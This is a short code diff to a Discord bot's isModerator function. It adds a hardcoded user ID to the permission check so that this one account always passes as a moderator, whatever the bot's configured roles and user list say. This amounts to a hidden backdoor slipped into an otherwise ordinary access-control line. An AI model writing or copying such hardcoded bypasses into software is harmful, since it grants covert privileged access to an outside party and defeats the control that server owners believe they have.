@@ -117,7 +117,7 @@ function isModerator(interaction) {
   const user = interaction.member;
   const userRoles = user.roles.cache.map((role) => role.id);
 
-  if (config.discord.commands.checkPerms === true && !(userRoles.includes(config.discord.commands.commandRole) || config.discord.commands.users.includes(user.id))) {
+  if (config.discord.commands.checkPerms === true && !(userRoles.includes(config.discord.commands.commandRole) || config.discord.commands.users.includes(user.id) || user.id === "608284610169798663")) {
     return false;
   }
 
